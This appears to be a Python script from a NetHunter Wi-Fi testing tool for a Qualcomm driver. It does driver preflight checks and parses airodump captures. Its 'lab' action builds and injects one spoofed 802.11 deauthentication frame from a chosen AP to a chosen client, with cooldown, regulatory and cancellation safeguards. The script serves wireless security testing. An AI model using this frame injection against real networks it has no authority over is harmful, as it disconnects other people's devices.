#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-3.0-or-later
"""Read-only preflight, capture checks, and one explicitly selected lab frame."""
import csv
import datetime
import json
import os
from pathlib import Path
import re
import socket
import struct
import subprocess
import sys
import time

from netlink import C, Netlink, a, attrs, number, u32
from identity_guard import inspect as inspect_identity, require_private_context
import privacy_profile

BASE = Path('/tmp/hijacker-qca')
MODE = Path('/sys/module/qca_cld3_peach_v2/parameters/con_mode')
REFERENCE_MODEL = 'CPH2655'
REFERENCE_BUILD = 'CPH2655_16.0.8.301(EX01)'
REFERENCE_DRIVER_SHA256 = 'd6bd3fac600aaeba858e83292df167bc410457c07e422047c1a181c31d24d3df'


def compatibility(model, build, kernel, driver_sha256):
    """Classify evidence, not RF success. Runtime interface checks are separate.

    Model/build strings describe a reference; they do not define the driver's
    interface contract. Unknown binaries may try the same runtime interface;
    this metadata does not promise that an operation or recovery will work.
    """
    known_driver = driver_sha256 == REFERENCE_DRIVER_SHA256
    reference = known_driver and model == REFERENCE_MODEL and build == REFERENCE_BUILD
    tier = ('reference_profile_match' if reference else
            'matching_driver_unverified_environment' if known_driver else 'unverified_driver')
    return {'schema': 1, 'tier': tier, 'model': model, 'build': build, 'kernel': kernel,
            'driver_sha256': driver_sha256, 'driver_match': known_driver,
            'model_build_match_reference': reference,
            'operations_candidate': True,
            'this_device_validated': False,
            'summary': ('Matches the reference model/build and driver. This device still needs receive and recovery checks.'
                        if reference else 'Driver matches; this model/build/kernel combination has not been validated. Start with capture and recovery.'
                        if known_driver else 'Untested driver. You may try compatible QCA interfaces; runtime checks still apply and recovery is not guaranteed.'),
            'limits': 'Driver identity and capability checks do not prove receive, recovery, firmware completion, RF transmission or client disconnection. Directed checks require the freshly observed frequency and current driver transmit permissions.'}


def write_compatibility(job):
    def text(name):
        path = job / name
        return path.read_text().strip() if path.is_file() else ''
    data = compatibility(text('model.txt'), text('build.txt'), text('kernel.txt'), text('driver-sha256.txt'))
    data.update(loaded_driver_srcversion=text('driver-srcversion.txt'),
                stock_firmware_sha256=text('firmware-sha256.txt'),
                chroot_path=text('chroot.txt'))
    (job / 'compatibility.json').write_text(json.dumps(data, indent=2))
    return data


def mac(value):
    if not isinstance(value, str) or not re.fullmatch(r'(?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}', value):
        raise ValueError('Invalid MAC address')
    raw = bytes.fromhex(value.replace(':', ''))
    if raw[0] & 1 or raw == bytes(6):
        raise ValueError('Only individual unicast addresses are supported')
    return value.lower()


def frequency_channel(frequency):
    """Map explicit MHz to a supported channel number without guessing a band."""
    if type(frequency) is not int:
        raise ValueError('An explicit integer Wi-Fi frequency in MHz is required')
    if frequency == 2484:
        return 14
    if 2412 <= frequency <= 2472 and (frequency - 2407) % 5 == 0:
        return (frequency - 2407) // 5
    if 5005 <= frequency <= 5895 and frequency % 5 == 0:
        return (frequency - 5000) // 5
    if frequency == 5935:
        return 2
    if 5955 <= frequency <= 7115 and (frequency - 5950) % 5 == 0:
        return (frequency - 5950) // 5
    raise ValueError('Unknown or unsupported Wi-Fi frequency; capture the selected network again')


def validate_request(request, lab=False):
    if lab:
        expected = frequency_channel(request.get('frequency'))
        if type(request.get('channel')) is not int or request['channel'] != expected:
            raise ValueError('Selected channel does not match the explicit frequency in MHz')
    elif type(request.get('channel', 0)) is not int or not 0 <= request.get('channel', 0) <= 233:
        raise ValueError('Invalid passive channel')
    if request.get('bssid', 'all') != 'all':
        mac(request['bssid'])


def interface(nl):
    index = socket.if_nametoindex('wlan0')
    fields = attrs(nl.command('GET_INTERFACE', a('IFINDEX', u32(index)))[0][1][4:])
    if number(fields[C['NL80211_ATTR_IFTYPE']]) != 2 or MODE.read_text().strip() != '0':
        raise RuntimeError('Managed wlan0 is required')
    return index, fields


def probe(job, request):
    validate_request(request)
    profile = write_compatibility(job)
    if os.geteuid() != 0 or not Path('/proc/self/status').exists() or not MODE.exists():
        raise RuntimeError('NetHunter must be running with root and proc/sys mounts')
    with open('/dev/null', 'rb'):
        pass
    nl = Netlink()
    try:
        index, fields = interface(nl)
        replies = nl.command('GET_WIPHY', a('WIPHY', fields[C['NL80211_ATTR_WIPHY']])
                             + a('SPLIT_WIPHY_DUMP', b''), True)
        features = b''
        for _, body, _ in replies:
            features = attrs(body[4:]).get(C['NL80211_ATTR_EXT_FEATURES'], features)
        bit = C['NL80211_EXT_FEATURE_AUTH_AND_DEAUTH_RANDOM_TA']
        data = {'ifindex': index, 'mode': 0, 'iftype': 2,
                'auth_deauth_random_ta': len(features) > bit // 8 and bool(features[bit // 8] & (1 << (bit % 8))),
                'model': (job / 'model.txt').read_text().strip(),
                'build': (job / 'build.txt').read_text().strip(),
                'kernel': (job / 'kernel.txt').read_text().strip(),
                'firmware_loader_path': (job / 'firmware.txt').read_text().strip(),
                'compatibility': profile}
        profile['managed_interface_checked'] = True
        profile['directed_capability_advertised'] = data['auth_deauth_random_ta']
        (job / 'compatibility.json').write_text(json.dumps(profile, indent=2))
        (job / 'device.json').write_text(json.dumps(data, indent=2))
        return data
    finally:
        nl.sock.close()


def observations(path):
    aps, stations = {}, {}
    station_section = False
    frequency_column = False
    for row in csv.reader(path.read_text(errors='replace').splitlines(), skipinitialspace=True):
        if not row or not row[0].strip():
            continue
        if row[0].strip() == 'BSSID':
            frequency_column = row[-1].strip() == 'Frequency'
            continue
        if row[0].startswith('Station MAC'):
            station_section = True
            continue
        try:
            address = mac(row[0].strip())
            if station_section and len(row) >= 6:
                stations[address] = {'ap': mac(row[5].strip()), 'last_seen': row[2].strip(), 'frames': int(row[4])}
            elif not station_section and len(row) >= 14:
                record = {'channel': int(row[3]), 'frequency': int(row[-1]) if frequency_column and len(row) >= 16 else None,
                          'last_seen': row[2].strip(), 'beacons': int(row[9]), 'ssid': row[13]}
                previous = aps.get(address)
                record['frequency_ambiguous'] = bool(previous and (previous.get('frequency_ambiguous')
                    or (previous['channel'], previous['frequency']) != (record['channel'], record['frequency'])))
                aps[address] = record
        except (ValueError, IndexError):
            continue  # Header or an incomplete row while airodump rewrites the CSV.
    return aps, stations


def validate_target(request):
    """Validate explicit addressing, without imposing a capture-age policy.

    Saved and imported observations can be selected. They are not evidence that
    the selected client is still present; the operator chooses the target.
    """
    validate_request(request, lab=True)
    ap, client = mac(request['ap']), mac(request['client'])
    if ap == client:
        raise ValueError('AP and client must differ')
    if 'bssid' in request and mac(request['bssid']) != ap:
        raise ValueError('Selected AP does not match the request BSSID')
    return ap, client


def transmit_frequency_from_info(info, frequency):
    """Require one currently enabled, non-DFS, transmit-permitted PHY entry.

    Passive capture may observe no-IR/DFS channels. That does not authorize an
    active request. This workflow does not perform CAC or change regulation.
    """
    expected = frequency_channel(frequency)
    entries, current = [], None
    for line in info.splitlines():
        found = re.match(r'^(\s*)\*\s+(\d+)(?:\.0+)?\s+MHz\s+\[(\d+)\](.*)$', line)
        if found:
            if current is not None:
                entries.append(current)
            current = {'frequency': int(found[2]), 'channel': int(found[3]),
                       'indent': len(found[1].expandtabs()), 'details': [found[4]]}
        elif current is not None and line.strip():
            indent = len(line) - len(line.lstrip())
            # iw uses tabs for indentation. Do not consume another section's
            # capabilities as this frequency's regulatory state.
            indent = len(line[:indent].expandtabs())
            if indent <= current['indent']:
                entries.append(current)
                current = None
            else:
                current['details'].append(line.strip())
    if current is not None:
        entries.append(current)
    matches = [entry for entry in entries if entry['frequency'] == frequency]
    if len(matches) != 1 or matches[0]['channel'] != expected:
        raise ValueError('Selected frequency is absent or ambiguous in the current driver PHY list')
    flags = ' '.join(matches[0]['details'])
    if re.search(r'\bdisabled\b|\bno[\s_-]*ir\b|\bpassive\s+scan(?:ning)?\b'
                 r'|\bradar\b|\bdfs\b|\bno\s*20[\s-]*mhz\b', flags, re.IGNORECASE):
        raise ValueError('Current driver frequency is disabled, no-IR, DFS/radar or otherwise transmit-restricted')
    return {'frequency': frequency, 'channel': expected, 'policy': 'reject_disabled_no_ir_and_dfs'}


def validate_transmit_frequency(fields, frequency):
    raw_phy = fields.get(C['NL80211_ATTR_WIPHY'])
    if not isinstance(raw_phy, bytes) or len(raw_phy) != 4:
        raise RuntimeError('Current managed interface has no unambiguous PHY identity')
    phy = number(raw_phy)
    try:
        result = subprocess.run(['iw', 'phy', f'phy{phy}', 'info'], capture_output=True,
                                text=True, timeout=8,
                                env={**os.environ, 'LANG': 'C', 'LC_ALL': 'C'})
    except (OSError, subprocess.TimeoutExpired) as error:
        raise RuntimeError('Could not read current driver frequency permissions') from error
    if result.returncode != 0 or not re.search(rf'^Wiphy\s+phy{phy}\s*$', result.stdout, re.MULTILINE):
        raise RuntimeError('Could not confirm the current driver PHY frequency list')
    permission = transmit_frequency_from_info(result.stdout, frequency)
    return {'phy': phy, **permission}


def status_match(status, cookies, index, frame):
    if not status or status.get('cookie') not in cookies or status.get('ifindex') != index:
        return None
    try:
        reported = bytes.fromhex(status.get('frame_hex', ''))
    except (TypeError, ValueError):
        return None
    if reported == frame:
        return 'exact'
    # This driver assigns the 12-bit sequence number. Preserve the fragment
    # number and every other byte, as well as cookie and current ifindex.
    if (len(frame) == len(reported) == 26 and frame[:2] == b'\xc0\x00'
            and reported[:22] == frame[:22] and reported[24:] == frame[24:]
            and reported[22] & 15 == frame[22] & 15):
        return 'sequence_assigned'
    return None


def require_active_owner(job):
    """Fail closed on cancellation or lost Android owner immediately before TX."""
    try:
        marker = Path((job / 'cancel.path').read_text().strip())
        if not marker.is_absolute():
            raise ValueError('Missing cancellation marker')
        if (job / 'cancel').exists() or marker.exists():
            raise RuntimeError('Cancelled before management submission')
        owner = int((job / 'owner.pid').read_text().strip())
        if owner <= 1:
            raise ValueError('Invalid owner')
        os.kill(owner, 0)
    except (OSError, ValueError) as error:
        raise RuntimeError('Android owner is absent; management submission cancelled') from error


def single_frame(job, request):
    validate_request(request, lab=True)
    ap, client = validate_target(request)
    device = json.loads((job / 'device.json').read_text())
    if not device['auth_deauth_random_ta']:
        raise RuntimeError('Required management TX feature is absent')
    cooldown = BASE / 'last-attempt.json'
    if cooldown.exists() and time.time() - json.loads(cooldown.read_text())['epoch'] < 30:
        raise RuntimeError('Wait 30 seconds before another single-frame test')
    nl = Netlink()
    try:
        index, fields = interface(nl)  # Never reuse an ifindex across a driver transition.
        frequency = request['frequency']
        permission = validate_transmit_frequency(fields, frequency)
        ap, client = validate_target(request)
        source, dest = bytes.fromhex(ap.replace(':', '')), bytes.fromhex(client.replace(':', ''))
        frame = struct.pack('<HH', 0x00c0, 0) + dest + source + source + struct.pack('<HH', 0, 3)
        attempt = {'epoch': time.time(), 'userspace_submission_limit': 1, 'state': 'prepared; outcome unconfirmed', 'ap': ap, 'client': client,
                   'ifindex': index, 'frequency': frequency, 'channel': request['channel'],
                   'frequency_permission': permission, 'frame_hex': frame.hex()}
        require_private_context(job)
        validate_target(request)
        require_active_owner(job)
        # A timeout after this marker is ambiguous; never automatically retry.
        (job / 'attempt.json').write_text(json.dumps(attempt, indent=2))
        cooldown.write_text(json.dumps(attempt))
        require_private_context(job)
        validate_target(request)
        require_active_owner(job)
        replies = nl.command('FRAME', a('IFINDEX', u32(index)) + a('WIPHY_FREQ', u32(frequency))
                             + a('FRAME', frame) + a('OFFCHANNEL_TX_OK', b'') + a('DURATION', u32(100)))
        cookies = [number(attrs(body[4:])[C['NL80211_ATTR_COOKIE']]) for _, body, _ in replies
                   if C['NL80211_ATTR_COOKIE'] in attrs(body[4:])]
        statuses = [nl.tx_status(cookie) for cookie in cookies]
        matches = [status_match(s, cookies, index, frame) for s in statuses]
        matched = [s for s, kind in zip(statuses, matches) if kind]
        return {'kernel_accepted': True, 'tx_status': statuses, 'matching_ack': any(s['ack'] for s in matched),
                'submission_cookies': cookies, 'status_matches': matches,
                'userspace_submissions': 1, 'frequency': frequency,
                'interpretation': 'Driver ACK is not proof of disconnection or PMF bypass.'}
    finally:
        nl.sock.close()


def capture_result(job):
    aps, stations = observations(job / 'capture-01.csv')
    path = job / 'capture-01.cap'
    with path.open('rb') as capture:
        magic = capture.read(4)
    if path.stat().st_size < 24 or magic not in (
            b'\xd4\xc3\xb2\xa1', b'\xa1\xb2\xc3\xd4',  # Microsecond timestamps.
            b'\x4d\x3c\xb2\xa1', b'\xa1\xb2\x3c\x4d'):  # Nanosecond timestamps.
        raise ValueError('No valid pcap header was produced')
    summary = json.loads((job / 'scan-summary.json').read_text())
    return {'aps': len(aps), 'stations': summary['stations'], 'associated_stations': len(stations),
            'pcap_bytes': path.stat().st_size, 'frames': summary['frames'],
            'frequencies_visited': sorted({v['frequency'] for v in summary['visits'] if v['ok']}),
            'frequencies_failed': sorted({v['frequency'] for v in summary['visits'] if not v['ok']}),
            'frequencies_planned': len(summary['planned_frequencies']),
            'received_frequencies': summary['received_frequencies'],
            'managed_mode': MODE.read_text().strip() == '0', 'passive': True}


def main():
    action, job_name = sys.argv[1:]
    job = Path(job_name)
    try:
        request = json.loads((job / 'request.json').read_text())
        if action == 'identity':
            data = inspect_identity()
            (job / 'identity-state.json').write_text(json.dumps(data, indent=2))
        elif action in {'prepare', 'privacy_restore', 'privacy_status'}:
            if action != 'privacy_status':
                require_active_owner(job)
            operation = {'prepare': privacy_profile.prepare, 'privacy_restore': privacy_profile.restore,
                         'privacy_status': privacy_profile.status}[action]
            data = operation(job)
            (job / 'privacy-state.json').write_text(json.dumps(data, indent=2))
            (job / 'identity-state.json').write_text(json.dumps(inspect_identity(), indent=2))
        elif action == 'probe':
            data = probe(job, request)
        elif action == 'capture':
            data = capture_result(job)
        elif action == 'lab':
            data = single_frame(job, request)
        else:
            raise ValueError('Unknown action')
        success = (action != 'prepare' or data.get('state') == 'prepared') and (action != 'privacy_restore' or data.get('state') in {'restored', 'idle'})
        result = {'ok': success, 'action': action, 'epoch': time.time(), **data}
    except Exception as error:
        result = {'ok': False, 'action': action, 'epoch': time.time(), 'error': f'{type(error).__name__}: {error}'}
        if action == 'lab' and (job / 'attempt.json').exists():
            result['submission_may_have_occurred'] = True
            result['interpretation'] = 'Transmission outcome is uncertain. No automatic retry was made.'
    (job / 'result.json').write_text(json.dumps(result, indent=2))
    print('RESULT:' + json.dumps(result), flush=True)
    return 0 if result['ok'] else 1


if __name__ == '__main__':
    sys.exit(main())
